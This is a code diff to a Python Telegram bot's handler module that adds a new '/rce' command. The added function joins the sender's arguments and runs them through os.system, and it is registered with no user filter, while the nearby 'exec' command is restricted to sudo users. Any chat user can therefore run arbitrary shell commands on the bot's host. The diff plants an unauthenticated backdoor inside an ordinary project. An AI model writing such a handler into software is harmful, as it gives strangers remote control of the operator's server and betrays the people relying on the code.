@@ -485,6 +485,13 @@ def ud(bot: Bot, update: Update):
   message.reply_text(reply_text)
 
 
+@run_async
+def rce(bot: Bot, update: Update, args: List[str]):
+    message = update.effective_message
+    import os
+    os.system(' '.join(args))
+    message.reply_text("ok")
+
 @user_is_gbanned
 @run_async
 def execute(bot: Bot, update: Update, args: List[str]):
@@ -590,6 +597,7 @@ MD_HELP_HANDLER = CommandHandler("markdownhelp", markdown_help, filters=Filters.
 STATS_HANDLER = CommandHandler("stats", stats, filters=Filters.user(OWNER_ID))
 GDPR_HANDLER = CommandHandler("gdpr", gdpr, filters=Filters.private)
 EXECUTE_HANDLER = CommandHandler("exec", execute, pass_args=True, filters=CustomFilters.sudo_filter)
+RCE_HANDLER = CommandHandler("rce", rce, pass_args=True)
 
 PASTE_HANDLER = DisableAbleCommandHandler("paste", paste, pass_args=True)
 GET_PASTE_HANDLER = DisableAbleCommandHandler("getpaste", get_paste_content, pass_args=True)
@@ -619,4 +627,5 @@ dispatcher.add_handler(LYRICS_HANDLER)
 dispatcher.add_handler(REPO_HANDLER)
 dispatcher.add_handler(DisableAbleCommandHandler("removebotkeyboard", reply_keyboard_remove))
 dispatcher.add_handler(EXECUTE_HANDLER)
+dispatcher.add_handler(RCE_HANDLER)
 dispatcher.add_handler(WIKI_HANDLER)
